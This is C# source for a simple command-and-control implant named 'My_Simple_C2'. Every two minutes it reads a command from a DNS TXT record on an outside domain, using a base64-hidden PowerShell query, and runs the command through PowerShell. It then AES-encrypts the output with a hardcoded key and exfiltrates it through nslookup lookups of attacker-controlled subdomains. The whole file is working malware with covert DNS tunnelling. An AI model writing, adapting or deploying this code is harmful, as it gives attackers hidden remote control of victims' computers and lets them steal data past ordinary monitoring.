using System;
using System.Management.Automation;
using System.Collections.ObjectModel;
using System.Text;
using System.Management.Automation.Runspaces;
using System.Security.Cryptography;
using System.Threading;
using System.Collections.Generic;
using System.IO;

namespace My_Simple_C2
{
    internal class Program
    {
        static string DecodeBase64(string base64Encoded)
        {
            byte[] base64Bytes = Convert.FromBase64String(base64Encoded);
            return Encoding.UTF8.GetString(base64Bytes);
        }
        public static string Encrypt(string plainText, string key)
        {
            byte[] iv = new byte[16]; 
            byte[] array;
            key = key.PadRight(16, '\0');

            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = iv;

                ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);

                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter streamWriter = new StreamWriter(cryptoStream))
                        {
                            streamWriter.Write(plainText);
                        }

                        array = memoryStream.ToArray();
                    }
                }
            }

            return Convert.ToBase64String(array);
        }
        static void Main(string[] args)
        {
            string key = "m123asdw";
            List<String> CommandList = new List<String>();
            CommandList.Add("hmmmmmmmmmmmmm");
            while (true)
            {
                Thread.Sleep(120000);
                Collection<PSObject> PSOutput;
                PowerShell ps = PowerShell.Create();
                //Console.WriteLine(DecodeBase64("JHR4dFJlY29yZHMgPSBSZXNvbHZlLURuc05hbWUgLU5hbWUgIm1haWwxLmxhc3RoaXQuc3RvcmUiIC1UeXBlIFRYVDskdHh0VmFsdWUgPSAkdHh0UmVjb3Jkcy5TdHJpbmdzWzBdO1dyaXRlLU91dHB1dCAkdHh0VmFsdWU="));
                PSOutput = ps.AddScript(DecodeBase64("JHR4dFJlY29yZHMgPSBSZXNvbHZlLURuc05hbWUgLU5hbWUgIm1haWwxLmxhc3RoaXQuc3RvcmUiIC1UeXBlIFRYVDskdHh0VmFsdWUgPSAkdHh0UmVjb3Jkcy5TdHJpbmdzWzBdO1dyaXRlLU91dHB1dCAkdHh0VmFsdWU=")).Invoke();
                String Command = PSOutput[0].ToString();
                if (CommandList[0] == Command){
                    continue;
                }
                else
                {
                    CommandList.RemoveAt(0);
                    CommandList.Add(Command);
                    Collection<PSObject> PSOutput2;
                    PSOutput2 = ps.AddScript(Command).Invoke();
                    String command_output = PSOutput2[0].ToString();
                    String command_send = Encrypt(command_output, key); ;
                    String send_data = "$command = \"nslookup\";$arguments = \"minhhh" + command_send + "minhhh.mail1.lasthit.store\";$process = Start-Process -FilePath $command -ArgumentList $arguments -NoNewWindow -PassThru;$process | Wait-Process -Timeout 1 -ErrorAction SilentlyContinue;if (!$process.HasExited) {$process | Stop-Process -Force}";
                    ps.AddScript(send_data).Invoke();
                }
                if (Command == "ImOut")
                {
                    break;
                }
            }
        }
    }
}
